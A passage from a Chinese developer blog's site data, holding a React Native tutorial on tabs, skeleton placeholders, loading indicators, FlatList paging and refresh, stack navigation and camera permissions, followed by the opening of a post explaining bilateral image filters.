&lt;/ScrollView&gt; ); &#125;; render() &#123; return ( &lt;Tabs tabs=&#123;this.state.tab&#125; initialPage=&#123;1&#125; tabBarPosition=&quot;top&quot; animated=&quot;true&quot; &gt; &#123;this.renderContent&#125; &lt;/Tabs&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123;&#125;); 其中Tabs还提供了许多自定义功能，允许我们设计TabBar组件的渲染方式，以及TabBar组件中的每个Tab的渲染方式（待测试） Tabs 属性 说明 类型 默认值 必选 tabs tab数据 Models.TabData[] true tabBarPosition TabBar位置 ‘top’ | ‘bottom’ top false renderTabBar 替换TabBar ((props: TabBarPropsType) =&gt; React.ReactNode) | false false initialPage 初始化Tab, index or key number | string false page 当前Tab, index or key number | string false swipeable 是否可以滑动内容切换 boolean true false useOnPan 使用跟手滚动 boolean true false prerenderingSiblingsNumber 预加载两侧Tab数量 number 1 false animated 是否开启切换动画 boolean true false onChange tab变化时触发 (tab: Models.TabData, index: number) =&gt; void false onTabClick tab 被点击的回调 (tab: Models.TabData, index: number) =&gt; void false destroyInactiveTab 销毁超出范围Tab boolean false false distanceToChangeTab 滑动切换阈值(宽度比例) number 0.3 false usePaged 是否启用分页模式 boolean true false tabBarUnderlineStyle tabBar下划线样式 React.CSSProperties | any false tabBarBackgroundColor tabBar背景色 string false tabBarActiveTextColor tabBar激活Tab文字颜色 string false tabBarInactiveTextColor tabBar非激活Tab文字颜色 string false tabBarTextStyle tabBar文字样式 React.CSSProperties | any false renderTab 替换TabBar的Tab (tab: Models.TabData) =&gt; React.ReactNode false renderUnderline renderUnderline (style: any) =&gt; React.ReactNode false rn-placeholder 为了显示更优雅的加载动画，提出了骨架屏的概念，用于显示加载中的页面，但该组件在antd-mobile-rn中并未提供，因此为了能够在RN上实现该效果，需要寻求另一个第三方组件的帮助，即rn-placeholder。 使用如下命令安装即可： 1$ yarn add rn-placeholder 该组件库为我们提供了三个基础组件： Placeholder PlaceholderMedia PlaceholderLine 以及一些配合使用的动效组件： Fade Shine ShineOverlay 使用如下代码即可看到三个基础组件的效果： 123456789101112131415161718import &#123; Placeholder, PlaceholderMedia, PlaceholderLine, Fade&#125; from &quot;rn-placeholder&quot;;const App = () =&gt; ( &lt;Placeholder Animation=&#123;Fade&#125; Left=&#123;PlaceholderMedia&#125; Right=&#123;PlaceholderMedia&#125; &gt; &lt;PlaceholderLine width=&#123;80&#125; /&gt; &lt;PlaceholderLine /&gt; &lt;PlaceholderLine width=&#123;30&#125; /&gt; &lt;/Placeholder&gt;); 其中Placeholder用于控制包裹在其中的所有相关组件的动效，PlaceholderMedia的显示效果为正方形的小方块 PlaceholderLine的显示效果即为文本条 但由于该组件需要使用三个组件分别设置样式，且不好控制个数与大小，因此需要对该组件进行进一步封装： 即我们需要通过简单的传参实现如下功能： 显示文本框的条数 是否包含标题 显示文本框的长度 动效 根究Loding状态加载骨架或组件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102import React from &quot;react&quot;;import &#123; Placeholder, PlaceholderMedia, PlaceholderLine, Fade,&#125; from &quot;rn-placeholder&quot;;import &#123; StyleSheet, ScrollView, View &#125; from &quot;react-native&quot;;const Title = (hasTitle) =&gt; &#123; return hasTitle ? ( &lt;Placeholder style=&#123;styles.title&#125;&gt; &lt;PlaceholderLine /&gt; &lt;/Placeholder&gt; ) : null;&#125;;const Placeholders = (props) =&gt; &#123; const &#123; ParagraphLength, hasTitle, firstLineWidth, lastLineWidth, width, style, &#125; = props; const PlaceholderContent = []; let widthList = Array(ParagraphLength).fill(width); widthList[0] = firstLineWidth ? firstLineWidth : width; widthList[widthList.length - 1] = lastLineWidth ? lastLineWidth : width; for (let key = 0; key &lt; ParagraphLength; key++) &#123; PlaceholderContent.push( &lt;Placeholder Animation=&#123;Fade&#125; style=&#123;styles.item&#125; key=&#123;`PlaceholderContentKey$&#123;key&#125;`&#125; &gt; &#123;Title(hasTitle)&#125; &lt;PlaceholderLine width=&#123;widthList[key]&#125; style=&#123;&#123; ...style &#125;&#125; /&gt; &lt;/Placeholder&gt; ); &#125; return ( &lt;ScrollView style=&#123;&#123; margin: 10 &#125;&#125;&gt; &#123;PlaceholderContent.map((item) =&gt; item)&#125; &lt;/ScrollView&gt; );&#125;;const ImageContent = (props) =&gt; &#123; const baseOption = &#123; ParagraphLength: 5, hasTitle: false, style: &#123; margin: 10, &#125;, lastLineWidth: 60, &#125;; const options = &#123; ...baseOption, ...props &#125;; const &#123; isLoading, list &#125; = props; if (isLoading) &#123; return Placeholders(options); &#125; return typeof list === &quot;function&quot; &amp;&amp; list();&#125;;const Paragraph = (props) =&gt; &#123; const baseOption = &#123; style: &#123; margin: 5, &#125;, width: 90, lastLineWidth: 70, firstLineWidth: 50, &#125;; const options = &#123; ...baseOption, ...props &#125;; const &#123; isLoading, list &#125; = props; if (isLoading) &#123; return Placeholders(options); &#125; return typeof list === &quot;function&quot; &amp;&amp; list();&#125;;/* 导出 ============================================================ */const ImagePlaceholder = ImageContent;const ParagraphPlaceholder = Paragraph;export &#123; ImagePlaceholder, ParagraphPlaceholder &#125;;/* 样式 ============================================================ */const styles = StyleSheet.create(&#123; title: &#123; marginBottom: 12, &#125;, item: &#123; margin: 12, &#125;,&#125;); 之后使用如下方式调用即可： ParagraphLength定义长度 isLoading用来绑定加载状态 list用于绑定loading结束后需要加载的组件 hastTitle用于定义是否需要显示标题占位 123456&lt;ParagraphPlaceholder ParagraphLength=&#123;10&#125; isLoading=&#123;this.state.isLoading&#125; list=&#123;this.getMy&#125; hasTitle=&#123;true&#125;&gt;&lt;/ParagraphPlaceholder&gt; 加载动画与上拉加载 加载动画 RN中提供了原生的Loading组件支持，即ActivityIndicator组件，并且可以通过styles文件对其进行样式控制，虽然使用较为方便，但考虑到后续需要使用不同风格的Loading，需对其封装以达到如下效果： 只需引入一条组件即可实现渲染 加载结束后显示应该出现在此处的组件 控制颜色 控制背景 后两个需求只需要通过props参数控制即可，而第二个要求则需要利用父子组件间的通信，传入回调函数，根据父组件的加载需求判断显示加载界面，还是父组件指定的其他组件，因此最终实现如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import React, &#123; Component &#125; from &quot;react&quot;;import &#123; StyleSheet, Text, View, ActivityIndicator, Dimensions,&#125; from &quot;react-native&quot;;const &#123; width, height &#125; = Dimensions.get(&quot;window&quot;);_this = null;class Loading extends Component &#123; constructor(props) &#123; super(props); &#125; render() &#123; const &#123; show, list &#125; = this.props; const color = this.props.color ? this.props.color : &quot;blue&quot;; const background = this.props.background ? true : false; if (show) &#123; return ( &lt;View style=&#123;styles.LoadingPage&#125;&gt; &lt;View style=&#123; background ? styles.hasBackground : styles.Loading &#125; &gt; &lt;ActivityIndicator size=&quot;large&quot; color=&#123;color&#125; /&gt; &lt;Text style=&#123;&#123; marginLeft: 10, color: color, marginTop: 10, &#125;&#125; &gt; 正在加载... &lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; ); &#125; else &#123; return typeof list === &quot;function&quot; &amp;&amp; list(); &#125; &#125;&#125;export default Loading;const styles = StyleSheet.create(&#123; LoadingPage: &#123; position: &quot;absolute&quot;, left: 0, top: 0, backgroundColor: &quot;rgba(0,0,0,0)&quot;, width: width, height: height, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, &#125;, Loading: &#123; width: 100, height: 100, opacity: 1, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, borderRadius: 7, &#125;, hasBackground: &#123; width: 100, height: 100, opacity: 1, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, borderRadius: 7, backgroundColor: &quot;rgba(0,0,0,0.6)&quot;, &#125;,&#125;); 调用方式如下： 12345&lt;Loading show=&#123;this.state.isLoading&#125; list=&#123;this.getHome&#125; color=&#123;&quot;red&quot;&#125; /&gt; 其中list参数需要传入一个函数，该函数用于渲染加载结束后的组件，show参数用于定义加载状态。 上拉加载 上拉加载使用了RN提供的另一个自定义程度极高的List组件：FlatList 该组件支持如下常用功能： 完全跨平台。 支持水平布局模式。 行组件显示或隐藏时可配置回调事件。 支持单独的头部组件。 支持单独的尾部组件。 支持自定义行间分隔线。 支持下拉刷新。 支持上拉加载。 支持跳转到指定行（ScrollToIndex）。 支持多列布局。 可以完全自定义list中每一个项目的表现形式，分割线表现形式。该组件基于VirtualizedList进行封装，继承了其所有props（也包括所有ScrollView的props） 该组件可定义程度极高，但包含两个必须的参数： renderItem data 其中renderItem用于从data中挨个取出数据并渲染到列表中，即定义data的渲染表示 data用于定义需要渲染的数据，为了简化起见，data 属性目前只支持普通数组。如果需要使用其他特殊数据结构，例如 immutable 数组，请直接使用更底层的VirtualizedList组件。 其余组件在此不一一介绍，实现上拉加载以及其动画需要使用如下参数： ListFooterComponent onEndReached onEndReachedThreshold 最终封装代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232import React from &quot;react&quot;;import &#123; ScrollView, Text, View, TouchableOpacity, StyleSheet, FlatList, ActivityIndicator,&#125; from &quot;react-native&quot;;import &#123; Tabs &#125; from &quot;@ant-design/react-native&quot;;import http from &quot;../../../utils/http/request&quot;;let pageNo = 1; //当前第几页let totalPage = 5; //总的页数let itemNo = 0; //item的个数export default class FlatListExample extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; isLoading: true, isRefresh: false, //网络请求状态 error: false, errorInfo: &quot;&quot;, dataArray: [], showFoot: 0, // 控制foot， 0：隐藏footer 1：已加载完成,没有更多数据 2 ：显示加载中 isRefreshing: false, //下拉控制 &#125;; &#125; fetchData(pageNo) &#123; let params = &#123; q: &quot;javascript&quot;, sort: &quot;stars&quot;, page: pageNo, &#125;; http.get(&quot;/search/repositories&quot;, params) .then((responseData) =&gt; &#123; let data = responseData.items; let dataBlob = []; let i = itemNo; data.map(function (item) &#123; dataBlob.push(&#123; key: i, value: item, &#125;); i++; &#125;); itemNo = i; console.log(&quot;itemNo:&quot; + itemNo); let foot = 0; if (pageNo &gt;= totalPage) &#123; foot = 1; //listView底部显示没有更多数据了 &#125; this.setState(&#123; //复制数据源 dataArray: this.state.dataArray.concat(dataBlob), isLoading: false, isRefresh: false, showFoot: foot, isRefreshing: false, &#125;); data = null; dataBlob = null; &#125;) .catch((error) =&gt; &#123; this.setState(&#123; error: true, errorInfo: error, &#125;); &#125;); &#125; componentDidMount() &#123; //请求数据 this.fetchData(pageNo); &#125; //加载等待页 renderLoadingView() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;ActivityIndicator animating=&#123;true&#125; color=&quot;red&quot; size=&quot;large&quot; /&gt; &lt;/View&gt; ); &#125; //加载失败view renderErrorView() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;Text&gt;Fail&lt;/Text&gt; &lt;/View&gt; ); &#125; //返回itemView _renderItemView(&#123; item &#125;) &#123; return ( &lt;View&gt; &lt;Text style=&#123;styles.title&#125;&gt;name: &#123;item.value.name&#125;&lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt; stars: &#123;item.value.stargazers_count&#125; &lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt; description: &#123;item.value.description&#125; &lt;/Text&gt; &lt;/View&gt; ); &#125; renderData() &#123; return ( &lt;FlatList // 定义数据显示效果 data=&#123;this.state.dataArray&#125; renderItem=&#123;this._renderItemView&#125; ItemSeparatorComponent=&#123;this._separator&#125; //下拉刷新相关 onRefresh=&#123;() =&gt; this._onRefresh()&#125; refreshing=&#123;this.state.isRefresh&#125; // 上拉加载相关 ListFooterComponent=&#123;this._renderFooter.bind(this)&#125; onEndReached=&#123;this._onEndReached.bind(this)&#125; onEndReachedThreshold=&#123;1&#125; /&gt; ); &#125; render() &#123; //第一次加载等待的view if (this.state.isLoading &amp;&amp; !this.state.error) &#123; return this.renderLoadingView(); &#125; else if (this.state.error) &#123; //请求失败view return this.renderErrorView(); &#125; //加载数据 return this.renderData(); &#125; _onRefresh() &#123; totalPage = 5; pageNo = 0; itemNo = 0; this.setState(&#123; isRefresh: true, dataArray: [], showFoot: 0, // 控制foot， 0：隐藏footer 1：已加载完成,没有更多数据 2 ：显示加载中 isRefreshing: false, //下拉控制 &#125;); this.fetchData(pageNo); &#125; _separator() &#123; return &lt;View style=&#123;&#123; height: 1, backgroundColor: &quot;#999999&quot; &#125;&#125; /&gt;; &#125; _renderFooter() &#123; if (this.state.showFoot === 1) &#123; return ( &lt;View style=&#123;&#123; height: 30, alignItems: &quot;center&quot;, justifyContent: &quot;flex-start&quot;, &#125;&#125; &gt; &lt;Text style=&#123;&#123; color: &quot;#999999&quot;, fontSize: 14, marginTop: 5, marginBottom: 5, &#125;&#125; &gt; 没有更多数据了 &lt;/Text&gt; &lt;/View&gt; ); &#125; else if (this.state.showFoot === 2) &#123; return ( &lt;View style=&#123;styles.footer&#125;&gt; &lt;ActivityIndicator /&gt; &lt;Text&gt;正在加载更多数据...&lt;/Text&gt; &lt;/View&gt; ); &#125; else if (this.state.showFoot === 0) &#123; return ( &lt;View style=&#123;styles.footer&#125;&gt; &lt;Text&gt;&lt;/Text&gt; &lt;/View&gt; ); &#125; &#125; _onEndReached() &#123; //如果是正在加载中或没有更多数据了，则返回 if (this.state.showFoot != 0) &#123; return; &#125; //如果当前页大于或等于总页数，那就是到最后一页了，返回 if (pageNo != 1 &amp;&amp; pageNo &gt;= totalPage) &#123; return; &#125; else &#123; pageNo++; &#125; //底部显示正在加载更多数据 this.setState(&#123; showFoot: 2 &#125;); //获取数据 this.fetchData(pageNo); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, flexDirection: &quot;row&quot;, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, backgroundColor: &quot;#F5FCFF&quot;, &#125;, title: &#123; fontSize: 15, color: &quot;blue&quot;, &#125;, footer: &#123; flexDirection: &quot;row&quot;, height: 24, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, marginBottom: 10, &#125;, content: &#123; fontSize: 15, color: &quot;black&quot;, &#125;,&#125;); 下拉刷新与点击跳转 下拉刷新 下拉刷新主要使用过上文提及的FlatList组件中提及的如下两个属性： onRefresh refreshing 其中第一个参数接收一个函数，用于指定刷新触发后的一些列操作。 第二个参数refreshing用来绑定描述刷新状态的属性，具体设置如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261import React from &quot;react&quot;;import &#123; ScrollView, Text, View, TouchableOpacity, StyleSheet, FlatList, ActivityIndicator,&#125; from &quot;react-native&quot;;import StackNavigator from &quot;react-navigation&quot;;import &#123; createNativeStackNavigator &#125; from &quot;@react-navigation/native-stack&quot;;import &#123; NavigationContainer &#125; from &quot;@react-navigation/native&quot;;import &#123; Tabs &#125; from &quot;@ant-design/react-native&quot;;import http from &quot;../../../utils/http/request&quot;;import Details from &quot;../Details/Details&quot;;let pageNo = 1; //当前第几页let totalPage = 5; //总的页数let itemNo = 0; //item的个数class FlatListExample extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; isLoading: true, isRefresh: false, //网络请求状态 error: false, errorInfo: &quot;&quot;, dataArray: [], showFoot: 0, // 控制foot， 0：隐藏footer 1：已加载完成,没有更多数据 2 ：显示加载中 isRefreshing: false, //下拉控制 &#125;; &#125; fetchData(pageNo, onRefresh = false) &#123; let params = &#123; q: &quot;javascript&quot;, sort: &quot;stars&quot;, page: pageNo, &#125;; http.get(&quot;/search/repositories&quot;, params) .then((responseData) =&gt; &#123; let data = responseData.items; let dataBlob = []; let i = itemNo; data.map(function (item) &#123; dataBlob.push(&#123; key: i, value: item, &#125;); i++; &#125;); itemNo = i; console.log(&quot;itemNo:&quot; + itemNo); let foot = 0; if (pageNo &gt;= totalPage) &#123; foot = 1; //listView底部显示没有更多数据了 &#125; this.setState(&#123; //复制数据源 dataArray: onRefresh ? dataBlob : this.state.dataArray.concat(dataBlob), isLoading: false, isRefresh: false, showFoot: foot, isRefreshing: false, &#125;); data = null; dataBlob = null; &#125;) .catch((error) =&gt; &#123; this.setState(&#123; error: true, errorInfo: error, &#125;); &#125;); &#125; componentDidMount() &#123; //请求数据 this.fetchData(pageNo); &#125; //加载等待页 renderLoadingView() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;ActivityIndicator animating=&#123;true&#125; color=&quot;red&quot; size=&quot;large&quot; /&gt; &lt;/View&gt; ); &#125; //加载失败view renderErrorView() &#123; return ( &lt;View style=&#123;styles.container&#125;&gt; &lt;Text&gt;Fail&lt;/Text&gt; &lt;/View&gt; ); &#125; //返回itemView _renderItemView = (&#123; item &#125;) =&gt; &#123; const navigation = this.props.navigation; return ( &lt;View&gt; &lt;TouchableOpacity onPress=&#123;() =&gt; &#123; navigation.navigate(&quot;Details&quot;, &#123; article: item, itemId: 10, &#125;); &#125;&#125; &gt; &lt;Text style=&#123;styles.title&#125;&gt;name: &#123;item.value.name&#125;&lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt; stars: &#123;item.value.stargazers_count&#125; &lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt; description: &#123;item.value.description&#125; &lt;/Text&gt; &lt;/TouchableOpacity&gt; &lt;/View&gt; ); &#125;; renderData() &#123; return ( &lt;FlatList // 定义数据显示效果 data=&#123;this.state.dataArray&#125; renderItem=&#123;this._renderItemView&#125; ItemSeparatorComponent=&#123;this._separator&#125; // //下拉刷新相关 onRefresh=&#123;() =&gt; this._onRefresh()&#125; refreshing=&#123;this.state.isRefresh&#125; // 上拉加载相关 ListFooterComponent=&#123;this._renderFooter.bind(this)&#125; onEndReached=&#123;this._onEndReached.bind(this)&#125; onEndReachedThreshold=&#123;1&#125; /&gt; ); &#125; render() &#123; //第一次加载等待的view if (this.state.isLoading &amp;&amp; !this.state.error) &#123; return this.renderLoadingView(); &#125; else if (this.state.error) &#123; //请求失败view return this.renderErrorView(); &#125; //加载数据 return this.renderData(); &#125; _onRefresh() &#123; totalPage = 5; pageNo = 0; itemNo = 0; this.setState(&#123; isRefresh: true, showFoot: 0, // 控制foot， 0：隐藏footer 1：已加载完成,没有更多数据 2 ：显示加载中 isRefreshing: false, //下拉控制 &#125;); this.fetchData(pageNo, (onRefresh = true)); &#125; _separator() &#123; return &lt;View style=&#123;&#123; height: 1, backgroundColor: &quot;#999999&quot; &#125;&#125; /&gt;; &#125; _renderFooter() &#123; if (this.state.showFoot === 1) &#123; return ( &lt;View style=&#123;&#123; height: 30, alignItems: &quot;center&quot;, justifyContent: &quot;flex-start&quot;, &#125;&#125; &gt; &lt;Text style=&#123;&#123; color: &quot;#999999&quot;, fontSize: 14, marginTop: 5, marginBottom: 5, &#125;&#125; &gt; 没有更多数据了 &lt;/Text&gt; &lt;/View&gt; ); &#125; else if (this.state.showFoot === 2) &#123; return ( &lt;View style=&#123;styles.footer&#125;&gt; &lt;ActivityIndicator /&gt; &lt;Text&gt;正在加载更多数据...&lt;/Text&gt; &lt;/View&gt; ); &#125; else if (this.state.showFoot === 0) &#123; return ( &lt;View style=&#123;styles.footer&#125;&gt; &lt;Text&gt;&lt;/Text&gt; &lt;/View&gt; ); &#125; &#125; _onEndReached() &#123; //如果是正在加载中或没有更多数据了，则返回 if (this.state.showFoot != 0) &#123; return; &#125; //如果当前页大于或等于总页数，那就是到最后一页了，返回 if (pageNo != 1 &amp;&amp; pageNo &gt;= totalPage) &#123; return; &#125; else &#123; pageNo++; &#125; //底部显示正在加载更多数据 this.setState(&#123; showFoot: 2 &#125;); //获取数据 this.fetchData(pageNo); &#125;&#125;const Stack = createNativeStackNavigator();function ModalStack() &#123; return ( &lt;NavigationContainer&gt; &lt;Stack.Navigator&gt; &lt;Stack.Screen name=&quot;Home&quot; component=&#123;FlatListExample&#125; /&gt; &lt;Stack.Screen name=&quot;Details&quot; component=&#123;Details&#125; /&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );&#125;export default ModalStack;const styles = StyleSheet.create(&#123; container: &#123; flex: 1, flexDirection: &quot;row&quot;, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, backgroundColor: &quot;#F5FCFF&quot;, &#125;, title: &#123; fontSize: 15, color: &quot;blue&quot;, &#125;, footer: &#123; flexDirection: &quot;row&quot;, height: 24, justifyContent: &quot;center&quot;, alignItems: &quot;center&quot;, marginBottom: 10, &#125;, content: &#123; fontSize: 15, color: &quot;black&quot;, &#125;,&#125;); 实现效果如下： 文章点击跳转 首先为了提高组件复用性，创建一个组件用于显示文章的详细信息，即Detailes组件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import React, &#123; Component &#125; from &quot;react&quot;;import &#123; NavigationContainer &#125; from &quot;@react-navigation/native&quot;;import &#123; createNativeStackNavigator &#125; from &quot;@react-navigation/native-stack&quot;;import &#123; tsConstructorType &#125; from &quot;@babel/types&quot;;import &#123; View, Text, StyleSheet &#125; from &quot;react-native&quot;;export default class Details extends Component &#123; constructor(props) &#123; super(props); this.state = &#123;&#125;; &#125; render() &#123; const navigationState = this.props.navigation.getState().routes[1].params; const item = navigationState.article; console.log(item); return ( &lt;View&gt; &lt;View style=&#123;styles.container&#125;&gt; &lt;Text style=&#123;styles.title&#125;&gt;&#123;item.value.name&#125;&lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt;&#123;item.value.description&#125;&lt;/Text&gt; &lt;/View&gt; &lt;/View&gt; ); &#125;&#125;const styles = StyleSheet.create(&#123; container: &#123; padding: 10, &#125;, title: &#123; fontSize: 30, justifyContent: &quot;center&quot;, alignContent: &quot;center&quot;, color: &quot;blue&quot;, margin: 10, &#125;, content: &#123; fontSize: 15, color: &quot;black&quot;, margin: 5, &#125;,&#125;); 其次，页面跳转由点击事件触发，为了不破坏原布局，使用组件TouchableOpacity包裹原List中的每一个条目，为其添加OnPress事件，并具有点击时透明的效果： 12345678910111213141516171819&lt;View&gt; &lt;TouchableOpacity onPress=&#123;() =&gt; &#123; navigation.navigate(&quot;Details&quot;, &#123; article: item, itemId: 10, &#125;); &#125;&#125; &gt; &lt;Text style=&#123;styles.title&#125;&gt;name: &#123;item.value.name&#125;&lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt; stars: &#123;item.value.stargazers_count&#125; &lt;/Text&gt; &lt;Text style=&#123;styles.content&#125;&gt; description: &#123;item.value.description&#125; &lt;/Text&gt; &lt;/TouchableOpacity&gt;&lt;/View&gt;); 然后使用组件react-navigation创建NavigationContainer以及StackNavigator，使用这两个组件将原组件FlatListExample组件包裹，并为其添加兄弟组件Details，这样就形成了一个两级的路由结构，只需对其进行命名并传入组件即可，形式如下： 1234567891011const Stack = createNativeStackNavigator();function ModalStack() &#123; return ( &lt;NavigationContainer&gt; &lt;Stack.Navigator&gt; &lt;Stack.Screen name=&quot;Home&quot; component=&#123;FlatListExample&#125; /&gt; &lt;Stack.Screen name=&quot;Details&quot; component=&#123;Details&#125; /&gt; &lt;/Stack.Navigator&gt; &lt;/NavigationContainer&gt; );&#125; 之后只需要在每一个Item的OnPress事件中增加路由逻辑即可： 12345onPress=&#123;() =&gt; &#123; navigation.navigate(&quot;Details&quot;, &#123; article: item, &#125;);&#125;&#125; 此处NavigationContainer组件会讲过navigation作为参数传递给组件，需要通过以下方式获得： 1const navigation = this.props.navigation; 现在点击就能够顺利跳转了，但是还有一个问题就是点击不同的标签需要显示不同的内容，此时就需要通过传参来实现，Navigation中，在制动跳转路由之后传入一个对象作为参数，此后，在组件中使用如下方式接收即可： 12const navigationState = this.props.navigation.getState().routes[1].params;const item = navigationState.article; 最终效果如下： RN访问摄像机与相册 通常情况下为了能使RN项目能够访问摄像头，需要在项目文件夹中的android目录下进行一些相关的权限配置，RN官方给出的摄像机权限配置如下： 打开项目中的android-&gt;app-&gt;src-&gt;main-&gt;AndroidManifest.xml文件，添加如下配置： 12&lt;uses-permission android:name=&quot;android.permission.CAMERA&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt; 打开项目中的android-&gt;app-&gt;src-&gt;main-&gt;java-&gt;com-&gt;当前项目名称文件夹-&gt;MainActivity.java文件，修改配置如下： 1234567891011121314151617181920package com.native_camera;import com.facebook.react.ReactActivity;// 1. 添加以下两行：import com.imagepicker.permissions.OnImagePickerPermissionsCallback; // &lt;- add this importimport com.facebook.react.modules.core.PermissionListener; // &lt;- add this importpublic class MainActivity extends ReactActivity &#123; // 2. 添加如下一行： private PermissionListener listener; // &lt;- add this attribute /** * Returns the name of the main component registered from JavaScript. * This is used to schedule rendering of the component. */ @Override protected String getMainComponentName() &#123; return &quot;task&quot;; &#125;&#125; 但实际上RN并没有提供很方便的调用摄像头的操作，于是找到了以下第三方插件：react-native-image-picker","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"React","slug":"前端/React","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/React/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"React","slug":"React","permalink":"http://enderxiao.github.io/tags/React/"},{"name":"前端框架","slug":"前端框架","permalink":"http://enderxiao.github.io/tags/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/"},{"name":"打工","slug":"打工","permalink":"http://enderxiao.github.io/tags/%E6%89%93%E5%B7%A5/"}]},{"title":"双边滤波器","slug":"双边滤波器","date":"2021-12-27T07:02:22.000Z","updated":"2024-07-30T11:26:33.931Z","comments":true,"path":"2021/12/27/双边滤波器/","permalink":"http://enderxiao.github.io/2021/12/27/%E5%8F%8C%E8%BE%B9%E6%BB%A4%E6%B3%A2%E5%99%A8/","excerpt":"关于双边滤波的理论介绍","text":"关于双边滤波的理论介绍 背景 使用OpenCV时，[OpenCV的官方文档](OpenCV: Smoothing Images)中提到了如下几种滤波器： 均值滤波器 中值滤波器 高斯滤波器 双边滤波器 前面三种到在课堂上有接触，但最后一种并没有听说过，于是便记录以下这种滤波器的特性 高斯滤波器与α-截尾均值滤波器 高斯滤波器原理与均值滤波器类似，都是取滤波器窗口内的像素均值作为输出，不过在均值滤波器中，模板系数均为相同的1，但高斯滤波器具有高斯函数图像的特性，中间高，四周逐渐减小，反映到滤波器上就是距离中心越近的模板系数越大，越远的模板系数越小。 α-截尾均值滤波器则与中值滤波器较为相似，其思想是将模板窗中的像素进行排序后，取消百分率为α的最小值与最大值，之后剩下的像素均值作为模板中心像素值。 可见，高斯滤波器考虑的是像素距离（空间域）的差别，而α截尾均值滤波器则考虑的是值域的差别。 双边滤波器 双边滤波器则将上述两种滤波器的想法融合，计算领域像素的加权组合： g(i,j)=∑k,lf(k,l)w(i,j,k,l)∑k,lw(i,j,k,l)g(i,j) = \\frac{\\sum_{k,l} f(k,l)w(i,j,k,l)}{\\sum_{k,l} w(i,j,k,l)}g(i,j)=∑k,l​w(i,j,k,l)∑k,l​f(k,l)w(i,j,k,l)​ 其中权重w的计算既考虑了像素距离差别，又考虑了值域的差别。w由如下两部分组成： d(i,j,k,l)=exp(−(i−k)2+(j−l)22σd2)d(i,j,k,l) = exp(-\\frac{(i-k)^2 + (j - l)^2}{2\\sigma ^2_d})d(i,j,k,l)=exp(−2σd2​(i−k)2+(j−l)2​) r(i,j,k,l)=exp(−∣f(i,j)−f(k,l)∣22σr2)r(i,j,k,l) = exp(-\\frac{|f(i,j) - f(k,l)|^2}{2\\sigma ^2_r})r(i,j,k,l)=exp(−2σr2​∣f(i,j)−f(k,l)∣2​) 即w的值为： w(i,j,k,l)=d(i,j,k,l)×r(i,j,k,l)w(i,j,k,l) = d(i,j,k,l) \\times r(i,j,k,l)w(i,j,k,l)=d(i,j,k,l)×r(i,j,k,l) 可见在加入r(i,j,k,l)后，滤波器具备了衡量像素相似程度的考量，即插值越大的像素，权值越小，对中心像素的影响也就越小。进而可以达到平滑图像的同时尽可能的保留边缘信息。 参考文献 双边滤波论文 [维基百科](Bilaterale Filterung – 